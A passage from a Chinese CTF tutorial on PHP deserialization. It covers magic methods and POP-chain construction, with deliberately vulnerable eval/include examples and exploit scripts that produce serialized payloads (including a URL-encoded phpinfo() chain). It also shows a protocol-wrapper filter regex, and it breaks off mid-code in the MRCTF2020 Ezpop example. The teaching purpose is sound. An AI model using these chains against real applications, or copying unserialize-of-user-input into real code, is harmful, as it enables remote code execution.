+    <a href="#__tostring" class="header-mark"></a><code>__toString()</code></h3><p><code>__toString()</code>魔术方法是最为最要的，在构造pop链中它往往是很关键的一环，在很多种情况下都会被调用，主要是下面这些：</p>
+<ol>
+<li><code>echo($obj)</code>或<code>print($obj)</code><strong>打印对象</strong>时会触发</li>
+<li><strong>反序列化对象</strong>与字符串连接时</li>
+<li><strong>反序列化对象</strong>参与格式化字符串时</li>
+<li><strong>反序列化对象</strong>与<strong>字符串</strong>进行<code>preg_match</code>正则匹配)，因为php进行弱比较时会转换参数类型，相当于都转换成字符串进行比较</li>
+<li><strong>反序列化对象</strong>参与<strong>格式化sql语句</strong>时，绑定参数时(用的少)</li>
+<li><strong>反序列化对象</strong>经过<strong>php字符串函数</strong>时，如<code>strlen()</code>，<code>addslashes()</code>时(用的少)</li>
+<li>在<code>in_array()</code>方法中，第一个参数是<strong>反序列化对象</strong>，第二个参数的数组中有<code>tostring</code>返回的字符串的时候<code>tostring</code>会被调用</li>
+<li><strong>反序列化对象</strong>作为<code>class_exists()</code>的参数的时候(用的少)</li>
+</ol>
+<p>通过看它被调用的情况，不难总结出，当对象被当成了字符串的时候，<code>__toString()</code>就会被调用，无论是将对象打印出来，还是将对象去与字符串进行比较，它都会被调用；这里要注意的是，必须要操作的是<strong>对象</strong>的时候，才会被调用</p>
+<p>新建了对象<code>t</code>就直接打印它，照理说肯定是不会有任何回显的，因为只有字符串能被打印，对象肯定是不能被直接打印的，需要先将它序列化成字符串后才可以打印；但我们这直接打印发现它居然有输出，就是因为它按照操作字符串的方法去操作了对象，所以说调用了<code>__toString()</code>，然后将它的返回值输出了出来</p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702596.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>再来看一个与字符串连接的例子，变量<code>t</code>被当成了字符串，然后与<code>t1</code>完成了连接</p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702220.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="__invoke" class="headerLink">
+    <a href="#__invoke" class="header-mark"></a><code>__invoke()</code></h3><p><code>__invoke</code>：当尝试以调用<strong>函数</strong>的方式调用一个<strong>对象</strong>时，<code>__invoke()</code>方法会被自动调用，而调用函数的方式就是在后面加上<code>()</code>，当我们看到像<code>return $function();</code>这种语句时，就应该意识到后面可能会调用<code>__invoke()</code>，下图是直接在对象后面加<code>()</code>调用</p>
+<p>需要注意的是，这个魔术方法只在<strong>PHP 5.3.0 及以上版本</strong>有效</p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702223.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="__get-和-__set" class="headerLink">
+    <a href="#__get-%e5%92%8c-__set" class="header-mark"></a><code>__get()</code> 和 <code>__set()</code></h3><p><code>__get()</code>：从<strong>不可访问的属性中</strong>读取数据，或者说是<strong>调用一个类及其父类方法中未定义属性时</strong></p>
+<p><code>__set()</code>：当给一个未定义的属性赋值时，或者修改一个不能被修改的属性时(<code>private</code> <code>protected</code>)(用的不多)</p>
+<p><code>echo</code>语句调用了<code>__toString()</code>，然后它返回的是当前对象的<code>t</code>属性，但我们是没有定义<code>t</code>这个属性的，所以说会调用<code>__get()</code>，然后将返回值打印出来</p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="__call-和-__callstatic" class="headerLink">
+    <a href="#__call-%e5%92%8c-__callstatic" class="header-mark"></a><code>__call()</code> 和 <code>__callStatic()</code></h3><p><code>__call</code>：在对象中调用类中不存在的方法时，或者是不可访问方法时被调用</p>
+<p><code>__callStatic</code>：在静态上下文中调用一个不可访问静态方法时被调用(用的不多)</p>
+<p>比如说像这段代码，我们调用对象<code>t</code>中的方法<code>t2</code>，但因为类中没有方法<code>t2</code>，所以说就调用了<code>__call()</code></p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702229.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="pop链" class="headerLink">
+    <a href="#pop%e9%93%be" class="header-mark"></a>POP链</h2><p>前面所讲解的序列化攻击更多的是<strong>魔术方法</strong>中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p>
+<p>POP 面向属性编程(Property-Oriented Programing) 常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是<strong>从现有运行环境</strong>中寻找一系列的代码或者指令调用，然后根据需求构成一组<strong>连续的调用链</strong>，最终达到攻击者邪恶的目的</p>
+<h3 id="构造思路" class="headerLink">
+    <a href="#%e6%9e%84%e9%80%a0%e6%80%9d%e8%b7%af" class="header-mark"></a>构造思路</h3><p><strong>找思路从尾到头</strong></p>
+<p>任何一条链子的构造，我们都要先找到它的<strong>头和尾</strong>，pop链也不例外，pop链的头部一般是用户能传入参数的地方，而尾部是可以执行我们操作的地方，比如说读写文件，执行命令等等；找到头尾之后，从尾部(我们执行操作的地方)开始，看它在哪个方法中，怎么样可以调用它，<strong>一层一层往上倒推</strong>，直到推到头部为止，也就是我们传参的地方，一条pop链子就出来了；在ctf中，头部一般都会是GET或者POST传参，然后可能就有一个<code>unserialize</code>直接将我们传入的参数反序列化了，尾部都是拿flag的地方；然后一环连着一环构成pop链</p>
+<h3 id="构造小技巧" class="headerLink">
+    <a href="#%e6%9e%84%e9%80%a0%e5%b0%8f%e6%8a%80%e5%b7%a7" class="header-mark"></a>构造小技巧</h3><p>先将每个类赋值给各个变量，<strong>构造从头到尾</strong>，根据顺序<strong>哪个类中的对象</strong>指向<strong>另一个类</strong></p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702268.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702234.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>比如<code>Show</code>类<code>__wakeup</code>魔术方法中的<code>source</code>属性指向<code>Show</code>类<code>__toString</code>魔术方法中的<code>str</code>属性，分开了说就是<code>Show</code>类中的<code>source</code>属性指向<code>Show</code>类所以才有了<code>$a -&gt; source = $b;</code></p>
+<h3 id="例题1level-0" class="headerLink">
+    <a href="#%e4%be%8b%e9%a2%981level-0" class="header-mark"></a>例题1——Level 0</h3><p>比如说这个例子，危险函数应该是<code>evil</code>类中的<code>action</code>方法，里面有个<code>eval</code>，但<code>action</code>方法并不是魔术方法，一般情况下我们是很难调用它的，但我们看到<code>test</code>类中的<code>__destruct()</code>调用了<code>action</code>方法，但在<code>__construct()</code>中可以看出它创建了一个<code>normal</code>类的对象，然后调用的是<code>normal</code>类中的<code>action</code>方法；这个就很好办，我们把魔术方法中的属性改一下，改成创建一个<code>evil</code>类的对象，那它自然调用的就是<code>evil</code>类中的<code>action</code>方法了</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">protected</span> <span class="nv">$ClassObj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ClassObj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">normal</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ClassObj</span><span class="o">-&gt;</span><span class="na">action</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">normal</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">function</span> <span class="nf">action</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;HelloWorld&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">evil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">private</span> <span class="nv">$data</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">function</span> <span class="nf">action</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>因为<code>ClassObj</code>属性是<code>protected</code>属性，不能在类外面访问它，所以说我们得在test类里面写一个<code>__construct()</code>来完成这个操作，构造 POP 链</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="nv">$ClassObj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ClassObj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">evil</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">evil</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$data</span><span class="o">=</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">test</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">//O%3A4%3A%22test%22%3A1%3A%7Bs%3A11%3A%22%00%2A%00ClassObj%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A10%3A%22%00evil%00data%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D
+</span></span></span></code></pre></div><p><figure><a class="lightgallery" href="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png" title="img" data-thumbnail="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png">
+        <img
+            
+            loading="lazy"
+            src="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png"
+            srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/202311211702463.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h3 id="例题2level-1" class="headerLink">
+    <a href="#%e4%be%8b%e9%a2%982level-1" class="header-mark"></a>例题2——Level 1</h3><p>先找链子的头和尾，头部明显是GET传参，尾部是Uwant类中的<code>getshell</code>，然后往上倒推，Uwant类中的<code>__get()</code>中调用了<code>getshell</code>，Show类中的<code>toString</code>调用了<code>__get()</code>，然后Hello类中的<code>__destruct()</code>，而我们GET传参之后会先进入<code>__destruct()</code>，这样子头和尾就连上了，所以说完整的链子就是：</p>
+<p>头 -&gt; Hello::__destruct() -&gt; Show::__toString() -&gt; Uwant::__get() -&gt; Uwant::getshell -&gt; 尾</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Hello</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">=</span><span class="nv">$name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">=</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Uwant</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$params</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="o">=</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">getshell</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getshell</span><span class="p">(</span><span class="nv">$value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>在Hello类中我们要把<code>$this-&gt;str</code>赋值成对象，下面<code>echo</code>出来才能调用Show类中的<code>__toString()</code>，然后再把Show类中的<code>$this-&gt;str['str']</code>赋值成对象，来调用Uwant类中的<code>__get()</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Hello</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Uwant</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$params</span><span class="o">=</span><span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Hello</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uwant</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">-&gt;</span> <span class="na">str</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>            <span class="c1">// Hello.str = new Show()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$b</span> <span class="o">-&gt;</span> <span class="na">str</span><span class="p">[</span><span class="s1">&#39;str&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$c</span><span class="p">;</span>     <span class="c1">// Show.str[&#39;str&#39;] = new Uwant()
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></div><h3 id="例题3mrctf2020ezpop" class="headerLink">
+    <a href="#%e4%be%8b%e9%a2%983mrctf2020ezpop" class="header-mark"></a>例题3——[MRCTF2020]Ezpop</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span>  <span class="nv">$var</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">append</span><span class="p">(</span><span class="nv">$value</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">include</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>           <span class="c1">// 5.尾部
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__invoke</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">append</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">var</span><span class="p">);</span>  <span class="c1">// 5.调用 append
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s2">&#34;&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>   <span class="c1">// 3.preg_match时调用，调用 __get
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>     <span class="c1">// 2.反序列化之后最先进入 __wakeup
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// __toString 需要将类的对象当作字符串处理，只要 preg_match 认为 source 是一个类的对象，假如这里成功赋值为对象，那么将调用的是这个作为值的对象的 __toString
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">echo</span> <span class="s2">&#34;hacker&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>    <span class="c1">// 4.访问不存在对象时调用
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>          <span class="c1">// 调用 Modifier 类中的 __invoke
